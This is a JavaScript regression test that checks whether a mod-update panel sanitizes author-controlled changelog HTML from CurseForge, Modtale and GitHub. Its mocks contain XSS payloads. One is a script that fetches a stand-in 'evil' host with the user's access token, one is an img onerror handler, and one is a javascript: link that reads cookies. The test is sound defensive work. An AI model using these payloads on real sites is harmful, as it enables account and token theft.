/**
 * Regression test: changelogs from CurseForge, Modtale and GitHub releases are
 * author-controlled HTML and are rendered with v-html in the panel. The
 * unified update status must never pass them through raw.
 */
import { describe, it, expect, vi } from 'vitest';

vi.mock('./cfwidget.js', () => ({
  getUpdateStatus: async () => ({ mods: [] }),
}));
vi.mock('./curseforge.js', () => ({
  getInstalledCurseForgeInfo: async () => ({
    '11': { filename: 'cf-mod.jar', modId: 11, modName: 'CF Mod', version: '1.0.0' },
  }),
  checkForUpdates: async () => [
    { modId: 11, hasUpdate: true, latestVersion: '1.1.0', latestFileId: 99 },
  ],
  getFileChangelog: async () =>
    '<p>CF notes</p><script>fetch("//evil/"+localStorage.accessToken)</script>',
}));
vi.mock('./modtale.js', () => ({
  getInstalledModtaleInfo: async () => ({
    p1: { filename: 'mt-mod.jar', projectId: 'p1', projectTitle: 'MT Mod', version: '1.0.0' },
  }),
  getModDetails: async () => ({
    versions: [
      {
        channel: 'RELEASE',
        versionNumber: '2.0.0',
        changelog: '<img src=x onerror=alert(1)>Modtale notes',
      },
    ],
  }),
}));
vi.mock('./stackmart.js', () => ({
  getInstalledStackMartInfo: async () => ({}),
  getResourceDetails: async () => null,
}));
vi.mock('./modStore.js', () => ({
  getModRegistry: async () => [{ id: 'store-mod', name: 'Store Mod', github: 'owner/repo' }],
  isModInstalled: async () => ({
    installed: true,
    filename: 'store-mod.jar',
    installedVersion: '1.0.0',
  }),
  getLatestRelease: async () => ({
    tag_name: 'v1.1.0',
    body: '## Release\n<a href="javascript:alert(document.cookie)">click</a>',
  }),
}));

const { getUnifiedUpdateStatus } = await import('./unifiedUpdates.js');

describe('getUnifiedUpdateStatus changelog sanitizing', () => {
  it('sanitizes CurseForge, Modtale and GitHub changelogs', async () => {
    const status = await getUnifiedUpdateStatus();
    const bySource = Object.fromEntries(status.mods.map((m) => [m.source, m.changelog]));

    expect(bySource.curseforge).toBe('<p>CF notes</p>');
    expect(bySource.modtale).toBe('<img>Modtale notes');
    expect(bySource.modstore).toBe('## Release\n<a>click</a>');

    for (const changelog of Object.values(bySource)) {
      expect(changelog).not.toMatch(/<script|onerror|javascript:/i);
    }
  });
});
